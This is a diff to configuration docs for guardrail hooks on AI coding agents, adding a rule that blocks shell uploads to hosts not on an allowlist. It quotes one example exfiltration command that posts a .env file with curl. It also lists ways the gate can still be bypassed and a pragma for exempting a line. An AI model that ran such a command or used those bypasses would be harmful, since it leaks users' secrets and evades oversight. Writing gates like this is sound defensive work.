@@ -141,6 +141,20 @@ block-no-verify:
     There is little to tune, and that is the point. If you find yourself widening this one,
     the hook it keeps bypassing is the thing to fix.
 
+block-unapproved-egress:
+  solves: >
+    The exfiltration step that any other gate leaves untouched: once an agent can run a
+    shell, one `curl -d @.env https://somewhere` sends your secrets out the tool channel.
+    This blocks the obvious reflex -- a network client that uploads a body to a host you
+    have not allowlisted -- so the easy path costs the adversary a visible allowlist edit.
+  customise: >
+    The allowlist IS the policy. `ALLOWED_HOSTS` ships with package registries and code
+    hosting; add your org's own upload targets (log sinks, artifact stores, internal APIs).
+    Be honest about the ceiling: this is a tool-time floor, not a network sandbox. Combined
+    short flags, obfuscated payloads, non-standard clients and egress via a language runtime
+    all remain reachable -- containing a determined adversary needs real sandboxing, and a
+    reviewed exception rides in the diff via `pragma: allowlist egress` on the line.
+
 block-unpinned-agent-components:
   solves: >
     The MCP server added as `npx -y something@latest`, which re-resolves on every start.
